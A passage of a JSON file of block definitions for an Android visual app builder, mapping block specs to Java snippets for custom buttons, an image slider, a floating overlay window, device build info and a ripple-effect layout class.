LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\r\n%1$s.setTextColor(%3$s);\n%1$s.setTextSize(TypedValue.COMPLEX_UNIT_DIP, %4$s);\n%5$s.addView(%1$s);","name":"TextOnNeo","palette":"49","type":" ","spec":"TextOnNeo ID %s.inputOnly at %m.activity Color %m.color Size %d inflateTo %m.view"},{"code":"%1$s","name":"ViewNeoText","typeName":"View","palette":"49","type":"v","spec":"%m.neoText"},{"code":"%1$s.setText(%2$s);","name":"TextOnNeoSetText","typeName":"View","palette":"49","type":" ","spec":"TextVieOnNeo %m.textview setText %s"},{"code":"%1$s.setShadow_radius((float)%2$s);","name":"ShadowRadius","palette":"49","type":" ","spec":"%m.view setShadowRadius %d"},{"code":"%1$s.setShadow_position_x((float)%2$s);","name":"ShadowPositionX","palette":"49","type":" ","spec":"%m.view setShadowPositionX %d"},{"code":"%1$s.setShadow_position_y((float)%2$s);","name":"ShadowPositionY","palette":"49","type":" ","spec":"%m.view setShadowPositionY %d"},{"code":"%1$s \u003d new RectButton(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\n%3$s.addView(%1$s);","name":"RectButton","palette":"49","type":" ","spec":"Create %m.RectButton at %m.activity inflateTo %m.view"},{"code":"%1$s.setTopLeftRadius((float)%2$s);","name":"RectSetTopLeftRadius","palette":"49","type":" ","spec":"RectButton %m.view setTopLeftRadius %d"},{"code":"%1$s.setTopRightRadius((float)%2$s);","name":"RectSetTopRightRadius","palette":"49","type":" ","spec":"RectButton %m.view setTopRightRadius %d"},{"code":"%1$s.setBottomRightRadius((float)%2$s);","name":"RectSetBottomRightRadius","palette":"49","type":" ","spec":"RectButton %m.view setBottomRightRadius %d"},{"code":"%1$s.setBottomLeftRadius((float)%2$s);","name":"RectSetBottomLeftRadius","palette":"49","type":" ","spec":"RectButton %m.view setBottomLeftRadius %d"},{"code":"%1$s","name":"ViewRectButton","typeName":"View","palette":"49","type":"v","spec":"%m.RectButton"},{"code":"ImageView %1$s \u003d new ImageView(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\r\n%1$s.setImageResource(R.drawable.%3$s);\nint %1$SpaddingDp \u003d (int) %4$s;\nfloat %1$Sdensity \u003d getApplicationContext().getResources().getDisplayMetrics().density;\nint %1$SpaddingPixel \u003d (int)(%1$SpaddingDp * %1$Sdensity);\n%1$s.setPadding(%1$SpaddingPixel, %1$SpaddingPixel , %1$SpaddingPixel , %1$SpaddingPixel);\r\n%5$s.addView(%1$s);","name":"SetIconNoColor","palette":"49","type":" ","spec":"IconID %s.inputOnly at %m.activity Image %m.resource Padding %d addTo %m.view"},{"code":"%1$s \u003d new SliderLayout(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));\n%3$s.addView(%1$s);","name":"GlideSlider","palette":"50","type":" ","spec":"GlideSlider %m.SliderLayout at %m.activity inflateTo %m.view"},{"code":"\t\tcom.bumptech.glide.request.RequestOptions requestOptions \u003d new com.bumptech.glide.request.RequestOptions();\n\t\trequestOptions.%1$s();","name":"RequestOptionsType","palette":"50","type":" ","spec":"Glide RequestOptions %m.RequestOptionsType"},{"code":"requestOptions","name":"requestOptions","typeName":"RequestOptions","palette":"50","type":"v","spec":"requestOptions"},{"code":"centerCrop","name":"centerCrop","typeName":"RequestOptionsType","palette":"50","type":"v","spec":"centerCrop"},{"code":"centerInside","name":"centerInside","typeName":"RequestOptionsType","palette":"50","type":"v","spec":"centerInside"},{"code":"circleCrop","name":"circleCrop","typeName":"RequestOptionsType","palette":"50","type":"v","spec":"circleCrop"},{"code":"fitCenter","name":"fitCenter","typeName":"RequestOptionsType","palette":"50","type":"v","spec":"fitCenter"},{"code":"\t\t\tcom.glide.slider.library.slidertypes.TextSliderView sliderView \u003d new com.glide.slider.library.slidertypes.TextSliderView(this);","name":"TextSliderView","palette":"50","type":" ","spec":"TextSliderView CreateWidget "},{"code":"sliderView","name":"sliderView","typeName":"TextSliderView","palette":"50","type":"v","spec":"sliderView"},{"code":"\t\t\t%1$s\n\t\t\t.image(%2$s)\n\t\t\t.description(%3$s)\n\t\t\t.setRequestOption(%4$s)\n\t\t\t.setProgressBarVisible(%5$s)\n\t\t\t.setOnSliderClickListener(new com.glide.slider.library.slidertypes.BaseSliderView.OnSliderClickListener() {\n\t\t\t\t@Override\n\t\t\t\tpublic void onSliderClick(com.glide.slider.library.slidertypes.BaseSliderView slider) {\n\t\t\t\t    %6$s\n\t\t\t\t}\n\t\t\t});","name":"ConfigTextSliderView","palette":"50","type":"c","spec":"%m.TextSliderView setImage %s setDescription %s setRequestOptions %m.RequestOptions setProgressBar %b OnClick"},{"code":"%1$s.bundle(new Bundle());","name":"CreateBundle","palette":"50","type":" ","spec":"%m.TextSliderView new Bundle"},{"code":"%1$s.getBundle().putString(%2$s, %3$s);","name":"GetBundleData","palette":"50","type":" ","spec":"%m.TextSliderView putStringKey %s value %s"},{"code":"%1$s.addSlider(%2$s);","name":"SliderLayoutAddSliderView","palette":"50","type":" ","spec":"%m.SliderLayout addView %m.TextSliderView"},{"code":"\t\t%1$s.setPresetTransformer(SliderLayout.Transformer.Accordion);\n\t\t%1$s.setPresetIndicator(SliderLayout.PresetIndicators.Center_Top);\n\t\t%1$s.setCustomAnimation(new com.glide.slider.library.animations.DescriptionAnimation());\n\t\t%1$s.setDuration(%2$s);        \n\t\t%1$s.stopCyclingWhenTouch(%3$s);","name":"SliderConfigExtra","palette":"50","type":" ","spec":"%m.SliderLayout setDuration %d stopCyclingWhenTouch %b"},{"code":"\t\tfor (int position \u003d 0; position \u003c %1$s.size(); position++) {\n\t\t\t%2$s\n\t\t}","name":"CreateListDataSlider","palette":"50","type":"c","spec":"Slider CreatDataFrom List %m.listStr"},{"code":"position","name":"position","palette":"50","type":"d","spec":"position"},{"code":"slider.getBundle().getString(%1$s) + \"\"","name":"SliderGetString","typeName":"String","palette":"50","type":"v","spec":"Slider getString Key %s"},{"code":"%1$s \u003d new FancyButton(%2$s.this);\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT));","name":"FancyButton","palette":"51","type":" ","spec":"Create %m.FancyButton at %m.activity"},{"code":"%1$s.setText(%2$s);","name":"SetText","palette":"51","type":" ","spec":"%m.FancyButton setText %s"},{"code":"%1$s.setBackgroundColor(%2$s);","name":"SetBG_Color","palette":"51","type":" ","spec":"%m.FancyButton setBG_Color %m.color"},{"code":"%1$s.setFocusBackgroundColor(%2$s);","name":"SetFocusBG_Color","palette":"51","type":" ","spec":"%m.FancyButton setFocusBG_Color %m.color"},{"code":"%1$s.setTextSize(%2$s);","name":"SetTextSize","palette":"51","type":" ","spec":"%m.FancyButton setTextSize %d"},{"code":"%1$s.setRadius(%2$s);","name":"SetRadius","palette":"51","type":" ","spec":"%m.FancyButton setRadius %d"},{"code":"%1$s","name":"FancyButtonView","typeName":"View","palette":"51","type":"v","spec":"%m.FancyButton"},{"code":"//Version\n%1$s.setText(Build.VERSION.RELEASE);","name":"Version","palette":"38","type":" ","spec":"Version%m.textview"},{"code":"//Model\n%1$s.setText(Build.MANUFACTURER.concat(\" \".concat(Build.MODEL)));","name":"Model","palette":"38","type":" ","spec":"Model%m.textview"},{"code":"//Build Tags\n%1$s.setText(Build.TAGS);","name":"Build Tags","palette":"38","type":" ","spec":"Build Tags%m.textview"},{"code":"//Build User\n%1$s.setText(Build.USER);","name":"Build User","palette":"38","type":" ","spec":"Build User%m.textview"},{"code":"//Build Version SDK\n%1$s.setText(Build.VERSION.SDK);\n","name":"Build Version SDK","palette":"38","type":" ","spec":"Build Version SDK%m.textview"},{"code":"//Build ID\n%1$s.setText(Build.ID);","name":"Build ID","palette":"38","type":" ","spec":"Build ID%m.textview"},{"code":"final com.google.android.material.bottomsheet.BottomSheetDialog bs_base \u003d new com.google.android.material.bottomsheet.BottomSheetDialog(%1$s.this); bs_base.setCancelable(%2$s); View layBase \u003d getLayoutInflater().inflate(R.layout.%3$s, null); bs_base.setContentView(layBase); bs_base.show();","name":"BottomSheetDialog","palette":"40","type":" ","spec":"BottomSheetDialog on %m.activity setCancelable%b custom view%m.customViews"},{"code":"%s","color":"#34FFF4","name":"customView0","typeName":"customViews","palette":"40","type":"p","spec":"customView %s.inputOnly"},{"code":"%s","color":"#34FFF4","name":"customView0","typeName":"customViews","palette":"41","type":"p","spec":"customView %s.inputOnly"},{"code":"_reCall();\n\n}\nprivate WindowManager windowManager;\n\nprivate WindowManager.LayoutParams layoutParams;\n\nprivate View displayView;\n\nprivate void showFloatingWindow() {\n\nLayoutInflater layoutInflater \u003d LayoutInflater.from(this);\n\ndisplayView \u003d layoutInflater.inflate(R.layout.%s, null); displayView.setOnTouchListener(new FloatingOnTouchListener());\n\n%s\n\nwindowManager.addView(displayView, layoutParams);\n}\n\nprivate class FloatingOnTouchListener implements View.OnTouchListener { \nprivate int x;\nprivate int y;\n\n@Override public boolean onTouch(View view, MotionEvent event) {\n\nswitch (event.getAction()) { \ncase MotionEvent.ACTION_DOWN: \nx \u003d (int) event.getRawX(); \ny \u003d (int) event.getRawY(); \nbreak;\n\ncase MotionEvent.ACTION_MOVE: int nowX \u003d (int) event.getRawX(); \nint nowY \u003d (int) event.getRawY(); \nint movedX \u003d nowX - x; \nint movedY \u003d nowY - y; \nx \u003d nowX; y \u003d nowY; \nlayoutParams.x \u003d layoutParams.x + movedX; \nlayoutParams.y \u003d layoutParams.y + movedY; windowManager.updateViewLayout(view, layoutParams); \nbreak; \ndefault: \nbreak; \n}\n return true;\n }\n }\n\npublic void closes(){\ntry{\nwindowManager.removeView(displayView);\n}\ncatch(Exception e){\n        }\n    }\nprivate void _reCall(){","color":"#808200","name":"FloatingWindowLibrary","typeName":"","palette":"41","type":"c","spec":"floatingWindowLibrary view %m.customViews "},{"code":"android.provider.Settings.canDrawOverlays(%s.this)","color":"#808200","name":"canDrawOverlays","typeName":"","palette":"41","type":"b","spec":"%m.activity canDrawOverlays"},{"code":"Intent intent \u003d new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,\nUri.parse(\"package:\" + getPackageName()));\nstartActivity(intent);","color":"#808200","name":"getPermissionOverlay","typeName":"","palette":"41","type":" ","spec":"getOverLayPermission"},{"code":"showFloatingWindow();","color":"#808200","name":"showFloatingWindow","typeName":"","palette":"41","type":" ","spec":"showFloatingWindow"},{"code":"closes();","color":"#808200","name":"closeWindow","typeName":"","palette":"41","type":"f","spec":"closeWindow"},{"code":"final %s \u003d displayView.findViewById(R.id.%s);","color":"#808200","name":"FloatingFindViewID","typeName":"","palette":"41","type":" ","spec":"%s.inputOnly findViewById %s.inputOnly "},{"code":"new Object(){\n\t\t\tpublic void start(){\n\t\t\t\tnew AsyncTaskEx().execute();\n\t\t\t}\n\t\t\tpublic void run(){\n\t\t\t\t%s\n\t\t\t}\n\t\t\tfinal class AsyncTaskEx extends AsyncTask\u003cVoid, Void, Void\u003e {\n\t\t\t\t@Override\n\t\t\t\tprotected Void doInBackground(Void... arg0) {\n\t\t\t\t\trun();\n\t\t\t\t\treturn null;}\n\t\t\t\t@Override\n\t\t\t\tprotected void onPostExecute(Void result) {\n\t\t\t\t\t%s\n\t\t\t\t\treturn ;}\n\t\t\t\t@Override\n\t\t\t\tprotected void onPreExecute() {\n\t\t\t\t\treturn ;}}}.start();","color":"#41EAC1","name":"AsyncTaskVoid","typeName":"","palette":"41","type":"e","spec":"AsyncTask StartVoid \u003d\u003e Finish"},{"code":"new Object(){\n\t\t\t private void setB64Image(ImageView iv265, String s274){\n\t\t\t\t try{\n\t\t\t\t byte[] decodedString \u003d android.util.Base64.decode(s274.replace(\" \",\"\").replace(\"\\n\",\"\"), android.util.Base64.DEFAULT);\n\t\t\t\t android.graphics.Bitmap decodedByte \u003d android.graphics.BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length); \n\t\t\t\t iv265.setImageBitmap(decodedByte);\n\t\t\t\t }catch(Exception e72) {}\n\t\t\t }\n\t\t }.setB64Image(%s,%s);","color":"#9B639F","name":"setImageFromBase64String","typeName":"","palette":"41","type":" ","spec":"%m.imageview setBase64Image %s"},{"code":"windowManager \u003d (WindowManager) getSystemService(WINDOW_SERVICE); \nlayoutParams \u003d new WindowManager.LayoutParams();\n\nif (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.O) { \nlayoutParams.type \u003d WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY; \n} else { \nlayoutParams.type \u003d WindowManager.LayoutParams.TYPE_PHONE; \n}\n\nlayoutParams.format \u003d PixelFormat.RGBA_8888; layoutParams.gravity \u003d Gravity.LEFT | Gravity.TOP; layoutParams.flags \u003d WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE; layoutParams.width \u003d %s; layoutParams.height \u003d %s; layoutParams.x \u003d 0;\nlayoutParams.y \u003d 0;","color":"#808200","name":"onCreateFWTyp1","typeName":"","palette":"41","type":" ","spec":"addToOnCreateActivity (1) FW width %d height %d"},{"code":"new Object(){\n\tpublic String getScreenshotToB64() { try {\n\t\t\tView v1 \u003d getWindow().getDecorView().getRootView();\n\t\t\tv1.setDrawingCacheEnabled(true);\n\t\t\tjava.io.ByteArrayOutputStream baos \u003d new java.io.ByteArrayOutputStream();\n\t\t\tandroid.graphics.Bitmap bm \u003d android.graphics.Bitmap.createBitmap(v1.getDrawingCache()); \n\t\t\tv1.setDrawingCacheEnabled(false);\n\t\t\tbm.compress(android.graphics.Bitmap.CompressFormat.PNG, 100, baos);\n\t\t\tbyte[] imageBytes \u003d baos.toByteArray();\n\t\t\tString imageString \u003d android.util.Base64.encodeToString(imageBytes ,android.util.Base64.DEFAULT);\n\t\t\treturn imageString;\n\t\t}catch(Exception e){return \"\";}\n\t\n\t}\n\t}.getScreenshotToB64()","color":"#421B5B","name":"getScreenshotToB64","typeName":"","palette":"41","type":"s","spec":"getScreenshotToB64"},{"code":"\n}\npublic static class MaterialRippleLayout extends FrameLayout {\n    private static final int     DEFAULT_DURATION        \u003d 350;\n    private static final int     DEFAULT_FADE_DURATION   \u003d 75;\n    private static final float   DEFAULT_DIAMETER_DP     \u003d 35;\n    private static final float   DEFAULT_ALPHA           \u003d 0.2f;\n    private static final int     DEFAULT_COLOR           \u003d Color.BLACK;\n    private static final int     DEFAULT_BACKGROUND      \u003d Color.TRANSPARENT;\n    private static final boolean DEFAULT_HOVER           \u003d true;\n    private static final boolean DEFAULT_DELAY_CLICK     \u003d true;\n    private static final boolean DEFAULT_PERSISTENT      \u003d false;\n    private static final boolean DEFAULT_SEARCH_ADAPTER  \u003d false;\n    private static final boolean DEFAULT_RIPPLE_OVERLAY  \u003d false;\n    private static final int     DEFAULT_ROUNDED_CORNERS \u003d 0;\n    private static final int  FADE_EXTRA_DELAY \u003d 50;\n    private static final long HOVER_DURATION   \u003d 2500;\n    private final Paint paint  \u003d new Paint(Paint.ANTI_ALIAS_FLAG);\n    private final Rect  bounds \u003d new Rect();\n    private int      rippleColor;\n    private boolean  rippleOverlay;\n    private boolean  rippleHover;\n    private int      rippleDiameter;\n    private int      rippleDuration;\n    private int      rippleAlpha;\n    private boolean  rippleDelayClick;\n    private int      rippleFadeDuration;\n    private boolean  ripplePersistent;\n    private android.graphics.drawable.Drawable rippleBackground;\n    private boolean  rippleInAdapter;\n    private float    rippleRoundedCorners;\n    private float radius;\n    private AdapterView parentAdapter;\n    private View childView;\n    private AnimatorSet    rippleAnimator;\n    private ObjectAnimator hoverAnimator;\n    private Point currentCoords  \u003d new Point();\n    private Point previousCoords \u003d new Point();\n    private int layerType;\n    private boolean eventCancelled;\n    private boolean prepressed;\n    private int     positionInAdapter;\n    private GestureDetector   gestureDetector;\n    private PerformClickEvent pendingClickEvent;\n    private PressedEvent      pendingPressEvent;\n    public static RippleBuilder on(View view) {\n        return new RippleBuilder(view);\n    }\n    public MaterialRippleLayout(Context context) {\n        this(context, null, 0);\n    }\n    public MaterialRippleLayout(Context context, AttributeSet attrs) {\n        this(context, attrs, 0);\n    }\n    public MaterialRippleLayout(Context context, AttributeSet attrs, int defStyle) {\n        super(context, attrs, defStyle);\n        setWillNotDraw(false);\n        gestureDetector \u003d new GestureDetector(context, longClickListener);\n        \n        rippleColor \u003d DEFAULT_COLOR;\n        rippleDiameter \u003d  (int) dpToPx(getResources(), DEFAULT_DIAMETER_DP);\n        rippleOverlay \u003d DEFAULT_RIPPLE_OVERLAY;\n        rippleHover \u003d DEFAULT_HOVER;\n        rippleDuration \u003d DEFAULT_DURATION;\n        rippleAlpha \u003d (int) (255 * DEFAULT_ALPHA);\n        rippleDelayClick \u003d DEFAULT_DELAY_CLICK;\n        rippleFadeDuration \u003d DEFAULT_FADE_DURATION;\n        rippleBackground \u003d new android.graphics.drawable.ColorDrawable(DEFAULT_BACKGROUND);\n        ripplePersistent \u003d DEFAULT_PERSISTENT;\n        rippleInAdapter \u003d DEFAULT_SEARCH_ADAPTER;\n        rippleRoundedCorners \u003d DEFAULT_ROUNDED_CORNERS;\n\n        paint.setColor(rippleColor);\n        paint.setAlpha(rippleAlpha);\n        enableClipPathSupportIfNecessary();\n    }\n    @SuppressWarnings(\"unchecked\")\n    public \u003cT extends View\u003e T getChildView() {\n        return (T) childView;\n    }\n    @Override\n    public final void addView(View child, int index, ViewGroup.LayoutParams params) {\n        if (getChildCount() \u003e 0) {\n            throw new IllegalStateException(\"MaterialRippleLayout can host only one child\");\n        }\n        childView \u003d child;\n        super.addView(child, index, params);\n    }\n    @Override\n    public void setOnClickListener(OnClickListener onClickListener) {\n        if (childView \u003d\u003d null) {\n            throw new IllegalStateException(\"MaterialRippleLayout must have a child view to handle clicks\");\n        }\n        childView.setOnClickListener(onClickListener);\n    }\n    @Override\n    public void setOnLongClickListener(OnLongClickListener onClickListener) {\n        if (childView \u003d\u003d null) {\n            throw new IllegalStateException(\"MaterialRippleLayout must have a child view to handle clicks\");\n        }\n        childView.setOnLongClickListener(onClickListener);\n    }\n    @Override\n    public boolean onInterceptTouchEvent(MotionEvent event) {\n        return !findClickableViewInChild(childView, (int) event.getX(), (int) event.getY());\n    }\n    @Override\n    public boolean onTouchEvent(MotionEvent event) {\n        boolean superOnTouchEvent \u003d super.onTouchEvent(event);\n        if (!isEnabled() || !childView.isEnabled()) return superOnTouchEvent;\n        boolean isEventInBounds \u003d bounds.contains((int) event.getX(), (int) event.getY());\n        if (isEventInBounds) {\n            previousCoords.set(currentCoords.x, currentCoords.y);\n            currentCoords.set((int) event.getX(), (int) event.getY());\n        }\n        boolean gestureResult \u003d gestureDetector.onTouchEvent(event);\n        if (gestureResult || hasPerformedLongPress) {\n            return true;\n        } else {\n            int action \u003d event.getActionMasked();\n            switch (action) {\n                case MotionEvent.ACTION_UP:\n                    pendingClickEvent \u003d new PerformClickEvent();\n                    if (prepressed) {\n                        childView.setPressed(true);\n                        postDelayed(\n                            new Runnable() {\n                                @Override public void run() {\n                                    childView.setPressed(false);\n                                }\n                            }, ViewConfiguration.getPressedStateDuration());\n                    }\n                    if (isEventInBounds) {\n                        startRipple(pendingClickEvent);\n                    } else if (!rippleHover) {\n                        setRadius(0);\n                    }\n                    if (!rippleDelayClick \u0026\u0026 isEventInBounds) {\n                        pendingClickEvent.run();\n                    }\n                    cancelPressedEvent();\n                    break;\n                case MotionEvent.ACTION_DOWN:\n                    setPositionInAdapter();\n                    eventCancelled \u003d false;\n                    pendingPressEvent \u003d new PressedEvent(event);\n                    if (isInScrollingContainer()) {\n                        cancelPressedEvent();\n                        prepressed \u003d true;\n                        postDelayed(pendingPressEvent, ViewConfiguration.getTapTimeout());\n                    } else {\n                        pendingPressEvent.run();\n                    }\n                    break;\n                case MotionEvent.ACTION_CANCEL:\n                    if (rippleInAdapter) {\n                        currentCoords.set(previousCoords.x, previousCoords.y);\n                        previousCoords \u003d new Point();\n                    }\n                    childView.onTouchEvent(event);\n                    if (rippleHover) {\n                        if (!prepressed) {\n                            startRipple(null);\n                        }\n                    } else {\n                        childView.setPressed(false);\n                    }\n                    cancelPressedEvent();\n                    break;\n                case MotionEvent.ACTION_MOVE:\n                    if (rippleHover) {\n                        if (isEventInBounds \u0026\u0026 !eventCancelled) {\n                            invalidate();\n                        } else if (!isEventInBounds) {\n                            startRipple(null);\n                        }\n                    }\n                    if (!isEventInBounds) {\n                        cancelPressedEvent();\n                        if (hoverAnimator !\u003d null) {\n                            hoverAnimator.cancel();\n                        }\n                        childView.onTouchEvent(event);\n                        eventCancelled \u003d true;\n                    }\n                    break;\n            }\n            return true;\n        }\n    }\n    private void cancelPressedEvent() {\n        if (pendingPressEvent !\u003d null) {\n            removeCallbacks(pendingPressEvent);\n            prepressed \u003d false;\n        }\n    }\n    private boolean hasPerformedLongPress;\n    private android.view.GestureDetector.SimpleOnGestureListener longClickListener \u003d new GestureDetector.SimpleOnGestureListener() {\n        public void onLongPress(MotionEvent e) {\n            hasPerformedLongPress \u003d childView.performLongClick();\n            if (hasPerformedLongPress) {\n                if (rippleHover) {\n                    startRipple(null);\n                }\n                cancelPressedEvent();\n            }\n        }\n        @Override\n        public boolean onDown(MotionEvent e) {\n            hasPerformedLongPress \u003d false;\n            return super.onDown(e);\n        }\n    };\n    private void startHover() {\n        if (eventCancelled) return;\n        if (hoverAnimator !\u003d null) {\n            hoverAnimator.cancel();\n        }\n        final float radius \u003d (float) (Math.sqrt(Math.pow(getWidth(), 2) + Math.pow(getHeight(), 2)) * 1.2f);\n        hoverAnimator \u003d ObjectAnimator.ofFloat(this, radiusProperty, rippleDiameter, radius)\n            .setDuration(HOVER_DURATION);\n        hoverAnimator.setInterpolator(new android.view.animation.LinearInterpolator());\n        hoverAnimator.start();\n    }\n    private void startRipple(final Runnable animationEndRunnable) {\n        if (eventCancelled) return;\n        float endRadius \u003d getEndRadius();\n        cancelAnimations();\n        rippleAnimator \u003d new AnimatorSet();\n        rippleAnimator.addListener(new AnimatorListenerAdapter() {\n            @Override public void onAnimationEnd(Animator animation) {\n                if (!ripplePersistent) {\n                    setRadius(0);\n                    setRippleAlpha(rippleAlpha);\n                }\n                if (animationEndRunnable !\u003d null \u0026\u0026 rippleDelayClick) {\n                    animationEndRunnable.run();\n                }\n                childView.setPressed(false);\n            }\n        });\n        ObjectAnimator ripple \u003d ObjectAnimator.ofFloat(this, radiusProperty, radius, endRadius);\n        ripple.setDuration(rippleDuration);\n        ripple.setInterpolator(new android.view.animation.DecelerateInterpolator());\n        ObjectAnimator fade \u003d ObjectAnimator.ofInt(this, circleAlphaProperty, rippleAlpha, 0);\n        fade.setDuration(rippleFadeDuration);\n        fade.setInterpolator(new android.view.animation.AccelerateInterpolator());\n        fade.setStartDelay(rippleDuration - rippleFadeDuration - FADE_EXTRA_DELAY);\n        if (ripplePersistent) {\n            rippleAnimator.play(ripple);\n        } else if (getRadius() \u003e endRadius) {\n            fade.setStartDelay(0);\n            rippleAnimator.play(fade);\n        } else {\n            rippleAnimator.playTogether(ripple, fade);\n        }\n        rippleAnimator.start();\n    }\n    private void cancelAnimations() {\n        if (rippleAnimator !\u003d null) {\n            rippleAnimator.cancel();\n            rippleAnimator.removeAllListeners();\n        }\n        if (hoverAnimator !\u003d null) {\n            hoverAnimator.cancel();\n        }\n    }\n    private float getEndRadius() {\n        final int width \u003d getWidth();\n        final int height \u003d getHeight();\n        final int halfWidth \u003d width / 2;\n        final int halfHeight \u003d height / 2;\n        final float radiusX \u003d halfWidth \u003e currentCoords.x ? width - currentCoords.x : currentCoords.x;\n        final float radiusY \u003d halfHeight \u003e currentCoords.y ? height - currentCoords.y : currentCoords.y;\n        return (float) Math.sqrt(Math.pow(radiusX, 2) + Math.pow(radiusY, 2)) * 1.2f;\n    }\n    private boolean isInScrollingContainer() {\n        ViewParent p \u003d getParent();\n        while (p !\u003d null \u0026\u0026 p instanceof ViewGroup) {\n            if (((ViewGroup) p).shouldDelayChildPressedState()) {\n                return true;\n            }\n            p \u003d p.getParent();\n        }\n        return false;\n    }\n    private AdapterView findParentAdapterView() {\n        if (parentAdapter !\u003d null) {\n            return parentAdapter;\n        }\n        ViewParent current \u003d getParent();\n        while (true) {\n            if (current instanceof AdapterView) {\n                parentAdapter \u003d (AdapterView) current;\n                return parentAdapter;\n            } else {\n                try {\n                    current \u003d current.getParent();\n                } catch (NullPointerException npe) {\n                    throw new RuntimeException(\"Could not find a parent AdapterView\");\n                }\n            }\n        }\n    }\n    private void setPositionInAdapter() {\n        if (rippleInAdapter) {\n            positionInAdapter \u003d findParentAdapterView().getPositionForView(MaterialRippleLayout.this);\n        }\n    }\n    private boolean adapterPositionChanged() {\n        if (rippleInAdapter) {\n            int newPosition \u003d findParentAdapterView().getPositionForView(MaterialRippleLayout.this);\n            final boolean changed \u003d newPosition !\u003d positionInAdapter;\n            positionInAdapter \u003d newPosition;\n            if (changed) {\n                cancelPressedEvent();\n                cancelAnimations();\n                childView.setPressed(false);\n                setRadius(0);\n            }\n            return changed;\n        }\n        return false;\n    }\n    private boolean findClickableViewInChild(View view, int x, int y) {\n        if (view instanceof ViewGroup) {\n            ViewGroup viewGroup \u003d (ViewGroup) view;\n            for (int i \u003d 0; i \u003c viewGroup.getChildCount(); i++) {\n                View child \u003d viewGroup.getChildAt(i);\n                final Rect rect \u003d new Rect();\n                child.getHitRect(rect);\n                final boolean contains \u003d rect.contains(x, y);\n                if (contains) {\n                    return findClickableViewInChild(child, x - rect.left, y - rect.top);\n                }\n            }\n        } else if (view !\u003d childView) {\n            return (view.isEnabled() \u0026\u0026 (view.isClickable() || view.isLongClickable() || view.isFocusableInTouchMode()));\n        }\n        return view.isFocusableInTouchMode();\n    }\n    @Override\n    protected void onSizeChanged(int w, int h, int oldw, int oldh) {\n        super.onSizeChanged(w, h, oldw, oldh);\n        bounds.set(0, 0, w, h);\n        rippleBackground.setBounds(bounds);\n    }\n    @Override\n    public boolean isInEditMode() {\n        return true;\n    }\n    @Override\n    public void draw(Canvas canvas) {\n        final boolean positionChanged \u003d adapterPositionChanged();\n        if (rippleOverlay) {\n            if (!positionChanged) {\n                rippleBackground.draw(canvas);\n            }\n            super.draw(canvas);\n            if (!positionChanged) {\n                if (rippleRoundedCorners !\u003d 0) {\n                    Path clipPath \u003d new Path();\n                    RectF rect \u003d new RectF(0, 0, canvas.getWidth(), canvas.getHeight());\n                    clipPath.addRoundRect(rect, rippleRoundedCorners, rippleRoundedCorners, Path.Direction.CW);\n                    canvas.clipPath(clipPath);\n                }\n                canvas.drawCircle(currentCoords.x, currentCoords.y, radius, paint);\n            }\n        } else {\n            if (!positionChanged) {\n                rippleBackground.draw(canvas);\n                canvas.drawCircle(currentCoords.x, currentCoords.y, radius, paint);\n            }\n            super.draw(canvas);\n        }\n    }\n    private Property\u003cMaterialRippleLayout, Float\u003e radiusProperty\n        \u003d new Property\u003cMaterialRippleLayout, Float\u003e(Float.class, \"radius\") {\n        @Override\n        public Float get(MaterialRippleLayout object) {\n            return object.getRadius();\n        }\n        @Override\n        public void set(MaterialRippleLayout object, Float value) {\n            object.setRadius(value);\n        }\n    };\n    private float getRadius() {\n        return radius;\n    }\n    public void setRadius(float radius) {\n        this.radius \u003d radius;\n        invalidate();\n    }\n    private Property\u003cMaterialRippleLayout, Integer\u003e circleAlphaProperty\n        \u003d new Property\u003cMaterialRippleLayout, Integer\u003e(Integer.class, \"rippleAlpha\") {\n        @Override\n        public Integer get(MaterialRippleLayout object) {\n            return object.getRippleAlpha();\n        }\n        @Override\n        public void set(MaterialRippleLayout object, Integer value) {\n            object.setRippleAlpha(value);\n        }\n    };\n    public int getRippleAlpha() {\n        return paint.getAlpha();\n    }\n    public void setRippleAlpha(Integer rippleAlpha) {\n        paint.setAlpha(rippleAlpha);\n        invalidate();\n    }\n    public void setRippleColor(int rippleColor) {\n        this.rippleColor \u003d rippleColor;\n        paint.setColor(rippleColor);\n        paint.setAlpha(rippleAlpha);\n        invalidate();\n    }\n    public void setRippleOverlay(boolean rippleOverlay) {\n        this.rippleOverlay \u003d rippleOverlay;\n    }\n    public void setRippleDiameter(int rippleDiameter) {\n        this.rippleDiameter \u003d rippleDiameter;\n    }\n    public void setRippleDuration(int rippleDuration) {\n        this.rippleDuration \u003d rippleDuration;\n    }\n    public void setRippleBackground(int color) {\n        rippleBackground \u003d new android.graphics.drawable.ColorDrawable(color);\n        rippleBackground.setBounds(bounds);\n        invalidate();\n    }\n    public void setRippleHover(boolean rippleHover) {\n        this.rippleHover \u003d rippleHover;\n    }\n    public void setRippleDelayClick(boolean rippleDelayClick) {\n        this.rippleDelayClick \u003d rippleDelayClick;\n    }\n    public void setRippleFadeDuration(int rippleFadeDuration) {\n        this.rippleFadeDuration \u003d rippleFadeDuration;\n    }\n    public void setRipplePersistent(boolean ripplePersistent) {\n        this.ripplePersistent \u003d ripplePersistent;\n    }\n    public void setRippleInAdapter(boolean rippleInAdapter) {\n        this.rippleInAdapter \u003d rippleInAdapter;\n    }\n    public void setRippleRoundedCorners(int rippleRoundedCorner) {\n        this.rippleRoundedCorners \u003d rippleRoundedCorner;\n        enableClipPathSupportIfNecessary();\n    }\n    public void setDefaultRippleAlpha(float alpha) {\n        this.rippleAlpha \u003d (int) (255 * alpha);\n        paint.setAlpha(rippleAlpha);\n        invalidate();\n    }\n    public void performRipple() {\n        